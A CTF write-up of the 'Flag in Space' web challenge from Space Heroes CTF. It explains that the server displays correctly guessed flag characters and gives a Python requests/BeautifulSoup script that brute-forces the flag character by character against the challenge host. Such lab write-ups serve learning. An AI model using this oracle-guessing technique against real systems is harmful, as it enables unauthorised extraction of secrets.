# Flag in Space - Web

Space Heroes CTF had a number of space and scifi themed interesting challenges, and while I didn't get as much time as I would've liked to play around with them, this was one challenge that I found simple but particularly satisfying to solve - it was the second to last web challenge in the web category worth 300 points.

Upon visiting the URL, we are presented with a grid with a number of squares in it, with the first grid square containing the letter "s". We can also see that the URL itself has a query parameter flag, which initially has the value of "s" (http://172.105.154.14/?flag=s).

Whenever I see a query parameter used in any CTF challenge I tend to experiement with it straight away, and this one didn't take long to figure out. Knowing that the flag started with "shctf{", I used that as the value for the query param, and it filled the next several grid items with those letters. 

So what was happening was that the server was checking to see if what was in the query string matched the flag, and if the letters matched it would render them inside the grid divs. With this information I quickly wrote a python script to iterate over string.printable, using BeautifulSoup to parse the HTML that is returned by the request, and construct the flag, and this was the final script:

	import requests
	import string
	from bs4 import BeautifulSoup

	url = "http://172.105.154.14/?flag=s"

	known = "s"
	attempt = 1

	while True:
		# Iterate over string.printable
		for c in string.printable:
			print(f"Trying {url + c}")
			r = requests.get(url + c)
			soup = BeautifulSoup(r.text, 'html.parser')	# Parse the current div using BeautifulSoup
			result = soup.select('div')[attempt].get_text(strip=True)
			print(result)
			if c in result:
				url += c
				known += c
				attempt += 1
		print(f"Flag: {known}")

This was a fun challenge and while I wish I'd got to spend more time on the CTF overall, I did get first solve of this challenge, and anytime I get to use python + requests + string, whether it's a blind SQL injection or simply parsing some divs, I find myself very satisfied with the result.


